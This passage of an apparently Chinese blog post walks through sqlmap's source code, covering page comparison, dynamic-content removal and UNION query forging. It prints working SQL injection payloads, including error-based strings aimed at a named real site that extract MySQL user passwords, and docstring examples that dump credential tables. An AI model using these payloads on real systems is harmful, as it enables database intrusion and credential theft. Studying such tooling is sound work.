class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">comparison</span>(<span class="params">page, getRatioValue=<span class="literal">False</span>, pageLength=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">if</span> page <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">and</span> pageLength <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    regExpResults = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    seqMatcher = getCurrentThreadData().seqMatcher</span><br><span class="line">    <span class="comment">#logger.debug(kb.pageTemplate)</span></span><br><span class="line">    seqMatcher.set_seq1(kb.pageTemplate)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> page:</span><br><span class="line">        <span class="comment"># String to match in page when the query is valid</span></span><br><span class="line">        <span class="comment">#a.1 如果出现指定字符串，返回True</span></span><br><span class="line">        <span class="keyword">if</span> conf.string:</span><br><span class="line">            condition = conf.string <span class="keyword">in</span> page</span><br><span class="line">            <span class="keyword">return</span> condition <span class="keyword">if</span> <span class="keyword">not</span> getRatioValue <span class="keyword">else</span> (MAX_RATIO <span class="keyword">if</span> condition <span class="keyword">else</span> MIN_RATIO)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Regular expression to match in page when the query is valid</span></span><br><span class="line">        <span class="comment"># a.2 如果出现指定正则表达式，返回Ture</span></span><br><span class="line">        <span class="keyword">if</span> conf.regexp:</span><br><span class="line">            condition = re.search(conf.regexp, page, re.I | re.M) <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span></span><br><span class="line">            <span class="keyword">return</span> condition <span class="keyword">if</span> <span class="keyword">not</span> getRatioValue <span class="keyword">else</span> (MAX_RATIO <span class="keyword">if</span> condition <span class="keyword">else</span> MIN_RATIO)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># In case of an DBMS error page return None</span></span><br><span class="line">        <span class="keyword">if</span> kb.errorIsNone <span class="keyword">and</span> (wasLastRequestDBMSError() <span class="keyword">or</span> wasLastRequestHTTPError()):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># Dynamic content lines to be excluded before comparison</span></span><br><span class="line">        <span class="comment"># a.4 比较前先将两个页面的动态内容移除</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> kb.nullConnection:</span><br><span class="line">            page = removeDynamicContent(page)</span><br><span class="line">            seqMatcher.set_seq1(removeDynamicContent(kb.pageTemplate))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> pageLength:</span><br><span class="line">            pageLength = <span class="built_in">len</span>(page)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 连接发生错误</span></span><br><span class="line">    <span class="keyword">if</span> kb.nullConnection <span class="keyword">and</span> pageLength:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> seqMatcher.a:</span><br><span class="line">            errMsg = <span class="string">&quot;problem occured while retrieving original page content &quot;</span></span><br><span class="line">            errMsg += <span class="string">&quot;which prevents sqlmap from continuation. please rerun, &quot;</span></span><br><span class="line">            errMsg += <span class="string">&quot;and if problem persists please turn off optimization switches&quot;</span></span><br><span class="line">            <span class="keyword">raise</span> sqlmapNoneDataException, errMsg</span><br><span class="line"></span><br><span class="line">        ratio = <span class="number">1.</span> * pageLength / <span class="built_in">len</span>(seqMatcher.a)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ratio &gt; <span class="number">1.</span>:</span><br><span class="line">            ratio = <span class="number">1.</span> / ratio</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># 正常连接情况, 判断是否使用textOnly命令行参数</span></span><br><span class="line">        seqMatcher.set_seq1(getFilteredPageContent(seqMatcher.a, <span class="literal">True</span>) <span class="keyword">if</span> conf.textOnly <span class="keyword">else</span> seqMatcher.a)</span><br><span class="line">        seqMatcher.set_seq2(getFilteredPageContent(page, <span class="literal">True</span>) <span class="keyword">if</span> conf.textOnly <span class="keyword">else</span> page)</span><br><span class="line">        <span class="comment"># float 3 digits</span></span><br><span class="line">        ratio = <span class="built_in">round</span>(seqMatcher.quick_ratio(), <span class="number">3</span>)</span><br><span class="line">        logger.debug(<span class="string">&#x27;ratio: %s&#x27;</span> % ratio)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># If the url is stable and we did not set yet the match ratio and the</span></span><br><span class="line">    <span class="comment"># current injected value changes the url page content</span></span><br><span class="line">    <span class="keyword">if</span> kb.matchRatio <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">if</span> kb.pageStable <span class="keyword">and</span> ratio &gt;= LOWER_RATIO_BOUND <span class="keyword">and</span> ratio &lt;= UPPER_RATIO_BOUND:</span><br><span class="line">            kb.matchRatio = ratio</span><br><span class="line">            logger.debug(<span class="string">&quot;setting match ratio for current parameter to %.3f&quot;</span> % kb.matchRatio)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> <span class="keyword">not</span> kb.pageStable:</span><br><span class="line">            <span class="comment"># CONSTANT_RATIO = 0.900</span></span><br><span class="line">            kb.matchRatio = CONSTANT_RATIO</span><br><span class="line">            logger.debug(<span class="string">&quot;setting match ratio for current parameter to default value 0.900&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># If it has been requested to return the ratio and not a comparison</span></span><br><span class="line">    <span class="comment"># response</span></span><br><span class="line">    <span class="keyword">if</span> getRatioValue:</span><br><span class="line">        <span class="keyword">return</span> ratio</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># ratio &gt; 0.98, 认为两个页面一样</span></span><br><span class="line">    <span class="keyword">elif</span> ratio &gt; UPPER_RATIO_BOUND:  </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> kb.matchRatio <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># url 不稳定</span></span><br><span class="line">        <span class="keyword">if</span> kb.matchRatio == CONSTANT_RATIO:</span><br><span class="line">            <span class="keyword">return</span> ratio &gt; kb.matchRatio</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># DIFF_TOLERANCE = 0.05  magic number</span></span><br><span class="line">            <span class="keyword">return</span> (ratio - kb.matchRatio) &gt; DIFF_TOLERANCE</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">移除动态内容</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">removeDynamicContent</span>(<span class="params">page</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Removing dynamic content from supplied page basing removal on</span></span><br><span class="line"><span class="string">    precalculated dynamic markings</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> page:</span><br><span class="line">        <span class="keyword">for</span> item <span class="keyword">in</span> kb.dynamicMarkings:</span><br><span class="line">            prefix, suffix = item</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> prefix <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">and</span> suffix <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">elif</span> prefix <span class="keyword">is</span> <span class="literal">None</span>:<span class="literal">None</span></span><br><span class="line">                page = getCompiledRegex(<span class="string">&#x27;(?s)^.+%s&#x27;</span> % suffix).sub(suffix, page)</span><br><span class="line">            <span class="keyword">elif</span> suffix <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                page = getCompiledRegex(<span class="string">&#x27;(?s)%s.+$&#x27;</span> % prefix).sub(prefix, page)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                page = getCompiledRegex(<span class="string">&#x27;(?s)%s.+%s&#x27;</span> % (prefix, suffix)).sub(<span class="string">&#x27;%s%s&#x27;</span> % (prefix, suffix), page)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> page</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查找动态内容</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">findDynamicContent</span>(<span class="params">firstPage, secondPage</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    This function checks if the provided pages have dynamic content. If they</span></span><br><span class="line"><span class="string">    are dynamic, proper markings will be made</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    infoMsg = <span class="string">&quot;searching for dynamic content&quot;</span></span><br><span class="line">    logger.info(infoMsg)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 返回匹配的内容</span></span><br><span class="line">    blocks = SequenceMatcher(<span class="literal">None</span>, firstPage, secondPage).get_matching_blocks()</span><br><span class="line">    kb.dynamicMarkings = []</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Removing too small matching blocks</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; <span class="built_in">len</span>(blocks):</span><br><span class="line">        block = blocks[i]</span><br><span class="line">        (_, _, length) = block</span><br><span class="line"></span><br><span class="line">	<span class="comment"># DYNAMICITY_MARK_LENGTH = 32</span></span><br><span class="line">        <span class="keyword">if</span> length &lt;= DYNAMICITY_MARK_LENGTH:</span><br><span class="line">            blocks.remove(block)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Making of dynamic markings based on prefix/suffix principle</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(blocks) &gt; <span class="number">0</span>:</span><br><span class="line"></span><br><span class="line">	<span class="comment"># 在blocks的前后添加None</span></span><br><span class="line">        blocks.insert(<span class="number">0</span>, <span class="literal">None</span>)</span><br><span class="line">        blocks.append(<span class="literal">None</span>)</span><br><span class="line">	</span><br><span class="line">	<span class="comment"># </span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="built_in">len</span>(blocks) - <span class="number">1</span>):</span><br><span class="line">            prefix = firstPage[blocks[i][<span class="number">0</span>]:blocks[i][<span class="number">0</span>] + blocks[i][<span class="number">2</span>]] <span class="keyword">if</span> blocks[i] <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line">            suffix = firstPage[blocks[i + <span class="number">1</span>][<span class="number">0</span>]:blocks[i + <span class="number">1</span>][<span class="number">0</span>] + blocks[i + <span class="number">1</span>][<span class="number">2</span>]] <span class="keyword">if</span> blocks[i + <span class="number">1</span>] <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> prefix <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">and</span> blocks[i + <span class="number">1</span>][<span class="number">0</span>] == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> suffix <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">and</span> (blocks[i][<span class="number">0</span>] + blocks[i][<span class="number">2</span>] &gt;= <span class="built_in">len</span>(firstPage)):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">	    <span class="comment"># 去掉字符串头和尾的字母和数字</span></span><br><span class="line">            prefix = trimAlphaNum(prefix)</span><br><span class="line">            suffix = trimAlphaNum(suffix)</span><br><span class="line"></span><br><span class="line">            kb.dynamicMarkings.append((re.escape(prefix[-DYNAMICITY_MARK_LENGTH/<span class="number">2</span>:]) <span class="keyword">if</span> prefix <span class="keyword">else</span> <span class="literal">None</span>, re.escape(suffix[:DYNAMICITY_MARK_LENGTH/<span class="number">2</span>]) <span class="keyword">if</span> suffix <span class="keyword">else</span> <span class="literal">None</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(kb.dynamicMarkings) &gt; <span class="number">0</span>:</span><br><span class="line">        infoMsg = <span class="string">&quot;dynamic content marked for removal (%d region%s)&quot;</span> % (<span class="built_in">len</span>(kb.dynamicMarkings), <span class="string">&#x27;s&#x27;</span> <span class="keyword">if</span> <span class="built_in">len</span>(kb.dynamicMarkings) &gt; <span class="number">1</span> <span class="keyword">else</span> <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        logger.info(infoMsg)</span><br></pre></td></tr></table></figure>


<h3 id="grep-正则表达式-，-error-based-SQL-injection-可以检查"><a href="#grep-正则表达式-，-error-based-SQL-injection-可以检查" class="headerlink" title="grep(正则表达式)， error-based SQL injection, 可以检查"></a>grep(正则表达式)， error-based SQL injection, 可以检查</h3><p>MS SQL server， Oracle， Mysql等，使用的语句，使用随机字符串查询，如果返回结果的body，或者头部信息中包含我们构造的随机字符串，则认为存在漏洞.具体数据可以使用sqlmap, payloads.xml，例子:</p>
<h4 id="MySQL-5-0-AND-error-based-WHERE-or-HAVING-clause"><a href="#MySQL-5-0-AND-error-based-WHERE-or-HAVING-clause" class="headerlink" title="MySQL &gt;&#x3D; 5.0 AND error-based - WHERE or HAVING clause"></a>MySQL &gt;&#x3D; 5.0 AND error-based - WHERE or HAVING clause</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://to.goojje.com/qunba.php?ac=thread_qb&amp;tid=9136%20AND%20(SELECT%209066%20FROM(SELECT%20COUNT(*),CONCAT(CHAR(58,106,108,98,58),(MID((IFNULL(CAST(VERSION()%20AS%20CHAR),CHAR(32))),1,50)),CHAR(58,108,112,108,58),FLOOR(RAND(0)*2))x%20FROM%20information_schema.tables%20GROUP%20BY%20x)a)</span><br></pre></td></tr></table></figure>

<p>urldecode 后：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://to.goojje.com/qunba.php?ac=thread_qb&amp;tid=9136 AND (SELECT 9066 FROM(SELECT COUNT(*),CONCAT(CHAR(58,106,108,98,58),(MID((IFNULL(CAST(VERSION() AS CHAR),CHAR(32))),1,50)),CHAR(58,108,112,108,58),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)</span><br></pre></td></tr></table></figure>

<ul>
<li>CONCAT 字符串连接</li>
<li>IFNULL 判断是否为空</li>
<li>CAST 将字符串转化为不同的字符集</li>
<li>MID  字符串截取 MID(string, position[, length])</li>
<li>CHAR(58,106,108,98,58)  &#x3D;&gt; :bjl:</li>
<li>CHAR(58,108,112,108,58) &#x3D;&gt; :lpl:</li>
</ul>
<p>利用的Mysql的一个特性，<a target="_blank" rel="noopener" href="http://bugs.mysql.com/bug.php?id=32249">http://bugs.mysql.com/bug.php?id=32249</a></p>
<h4 id="Microsoft-SQL-Server-Sybase-AND-error-based-WHERE-or-HAVING-clause"><a href="#Microsoft-SQL-Server-Sybase-AND-error-based-WHERE-or-HAVING-clause" class="headerlink" title="Microsoft SQL Server&#x2F;Sybase AND error-based - WHERE or HAVING clause"></a>Microsoft SQL Server&#x2F;Sybase AND error-based - WHERE or HAVING clause</h4><p>这部分没有记录。</p>
<h4 id="PostgreSQL-AND-error-based-WHERE-or-HAVING-clause"><a href="#PostgreSQL-AND-error-based-WHERE-or-HAVING-clause" class="headerlink" title="PostgreSQL AND error-based - WHERE or HAVING clause"></a>PostgreSQL AND error-based - WHERE or HAVING clause</h4><p>这部分没有记录。</p>
<h4 id="Oracle-AND-error-based-WHERE-or-HAVING-clause-XMLType"><a href="#Oracle-AND-error-based-WHERE-or-HAVING-clause-XMLType" class="headerlink" title="Oracle AND error-based - WHERE or HAVING clause (XMLType)"></a>Oracle AND error-based - WHERE or HAVING clause (XMLType)</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://to.goojje.com/qunba.php?ac=thread_qb&amp;tid=9136 AND (SELECT 6531 FROM(SELECT COUNT(*),CONCAT(CHAR(58,121,121,98,58),(SELECT MID(IFNULL(CAST(concat(user,char(58),password) AS CHAR), CHAR(32)),1,50) FROM mysql.user LIMIT 0,1),CHAR(58,106,116,113,58),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)</span><br></pre></td></tr></table></figure>

<h3 id="unionTest-函数，UNION-query-inband-SQL-injection"><a href="#unionTest-函数，UNION-query-inband-SQL-injection" class="headerlink" title="unionTest() 函数，UNION query (inband) SQL injection"></a>unionTest() 函数，UNION query (inband) SQL injection</h3><p>(1) 设置union 使用的字符和注释<br>(2) 判断union查询的列数</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">forgeInbandQuery</span>(<span class="params">self, query, position, count, comment, prefix, suffix, char, multipleUnions=<span class="literal">None</span>, limited=<span class="literal">False</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Take in input an query (pseudo query) string and return its</span></span><br><span class="line"><span class="string">    processed UNION ALL SELECT query.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Examples:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    MySQL input:  CONCAT(CHAR(120,121,75,102,103,89),IFNULL(CAST(user AS CHAR(10000)), CHAR(32)),CHAR(106,98,66,73,109,81),IFNULL(CAST(password AS CHAR(10000)), CHAR(32)),CHAR(105,73,99,89,69,74)) FROM mysql.user</span></span><br><span class="line"><span class="string">    MySQL output:  UNION ALL SELECT NULL, CONCAT(CHAR(120,121,75,102,103,89),IFNULL(CAST(user AS CHAR(10000)), CHAR(32)),CHAR(106,98,66,73,109,81),IFNULL(CAST(password AS CHAR(10000)), CHAR(32)),CHAR(105,73,99,89,69,74)), NULL FROM mysql.user-- AND 7488=7488</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    PostgreSQL input:  (CHR(116)||CHR(111)||CHR(81)||CHR(80)||CHR(103)||CHR(70))||COALESCE(CAST(usename AS CHARACTER(10000)), (CHR(32)))||(CHR(106)||CHR(78)||CHR(121)||CHR(111)||CHR(84)||CHR(85))||COALESCE(CAST(passwd AS CHARACTER(10000)), (CHR(32)))||(CHR(108)||CHR(85)||CHR(122)||CHR(85)||CHR(108)||CHR(118)) FROM pg_shadow</span></span><br><span class="line"><span class="string">    PostgreSQL output:  UNION ALL SELECT NULL, (CHR(116)||CHR(111)||CHR(81)||CHR(80)||CHR(103)||CHR(70))||COALESCE(CAST(usename AS CHARACTER(10000)), (CHR(32)))||(CHR(106)||CHR(78)||CHR(121)||CHR(111)||CHR(84)||CHR(85))||COALESCE(CAST(passwd AS CHARACTER(10000)), (CHR(32)))||(CHR(108)||CHR(85)||CHR(122)||CHR(85)||CHR(108)||CHR(118)), NULL FROM pg_shadow-- AND 7133=713</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Oracle input:  (CHR(109)||CHR(89)||CHR(75)||CHR(109)||CHR(85)||CHR(68))||NVL(CAST(COLUMN_NAME AS VARCHAR(4000)), (CHR(32)))||(CHR(108)||CHR(110)||CHR(89)||CHR(69)||CHR(122)||CHR(90))||NVL(CAST(DATA_TYPE AS VARCHAR(4000)), (CHR(32)))||(CHR(89)||CHR(80)||CHR(98)||CHR(77)||CHR(80)||CHR(121)) FROM SYS.ALL_TAB_COLUMNS WHERE TABLE_NAME=(CHR(85)||CHR(83)||CHR(69)||CHR(82)||CHR(83))</span></span><br><span class="line"><span class="string">    Oracle output:  UNION ALL SELECT NULL, (CHR(109)||CHR(89)||CHR(75)||CHR(109)||CHR(85)||CHR(68))||NVL(CAST(COLUMN_NAME AS VARCHAR(4000)), (CHR(32)))||(CHR(108)||CHR(110)||CHR(89)||CHR(69)||CHR(122)||CHR(90))||NVL(CAST(DATA_TYPE AS VARCHAR(4000)), (CHR(32)))||(CHR(89)||CHR(80)||CHR(98)||CHR(77)||CHR(80)||CHR(121)), NULL FROM SYS.ALL_TAB_COLUMNS WHERE TABLE_NAME=(CHR(85)||CHR(83)||CHR(69)||CHR(82)||CHR(83))-- AND 6738=6738</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Microsoft SQL Server input:  (CHAR(74)+CHAR(86)+CHAR(106)+CHAR(116)+CHAR(116)+CHAR(108))+ISNULL(CAST(name AS VARCHAR(8000)), (CHAR(32)))+(CHAR(89)+CHAR(87)+CHAR(116)+CHAR(100)+CHAR(106)+CHAR(74))+ISNULL(CAST(master.dbo.fn_varbintohexstr(password) AS VARCHAR(8000)), (CHAR(32)))+(CHAR(71)+CHAR(74)+CHAR(68)+CHAR(66)+CHAR(85)+CHAR(106)) FROM master..sysxlogins</span></span><br><span class="line"><span class="string">    Microsoft SQL Server output:  UNION ALL SELECT NULL, (CHAR(74)+CHAR(86)+CHAR(106)+CHAR(116)+CHAR(116)+CHAR(108))+ISNULL(CAST(name AS VARCHAR(8000)), (CHAR(32)))+(CHAR(89)+CHAR(87)+CHAR(116)+CHAR(100)+CHAR(106)+CHAR(74))+ISNULL(CAST(master.dbo.fn_varbintohexstr(password) AS VARCHAR(8000)), (CHAR(32)))+(CHAR(71)+CHAR(74)+CHAR(68)+CHAR(66)+CHAR(85)+CHAR(106)), NULL FROM master..sysxlogins-- AND 3254=3254</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    @param query: it is a processed query string unescaped to be</span></span><br><span class="line"><span class="string">    forged within an UNION ALL SELECT statement</span></span><br><span class="line"><span class="string">    @type query: C&#123;str&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    @param position: it is the NULL position where it is possible</span></span><br><span class="line"><span class="string">    to inject the query</span></span><br><span class="line"><span class="string">    @type position: C&#123;int&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    @return: UNION ALL SELECT query string forged</span></span><br><span class="line"><span class="string">    @rtype: C&#123;str&#125;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> query.startswith(<span class="string">&quot;SELECT &quot;</span>):</span><br><span class="line">        query = query[<span class="built_in">len</span>(<span class="string">&quot;SELECT &quot;</span>):]</span><br><span class="line"></span><br><span class="line">    inbandQuery = self.prefixQuery(<span class="string">&quot;UNION ALL SELECT &quot;</span>, prefix=prefix)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> limited:</span><br><span class="line">        inbandQuery += <span class="string">&quot;,&quot;</span>.join(<span class="built_in">map</span>(<span class="keyword">lambda</span> x: char <span class="keyword">if</span> x != position <span class="keyword">else</span> <span class="string">&#x27;(SELECT %s)&#x27;</span> % query, xrange(<span class="number">0</span>, count)))</span><br><span class="line">        inbandQuery += FROM_TABLE.get(Backend.getIdentifiedDbms(), <span class="string">&quot;&quot;</span>)</span><br><span class="line">        inbandQuery = self.suffixQuery(inbandQuery, comment, suffix)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> inbandQuery</span><br><span class="line"></span><br><span class="line">    topNumRegex = re.search(<span class="string">&quot;\ATOP\s+([\d]+)\s+&quot;</span>, query, re.I)</span><br><span class="line">    <span class="keyword">if</span> topNumRegex:</span><br><span class="line">        topNum = topNumRegex.group(<span class="number">1</span>)</span><br><span class="line">        query = query[<span class="built_in">len</span>(<span class="string">&quot;TOP %s &quot;</span> % topNum):]</span><br><span class="line">        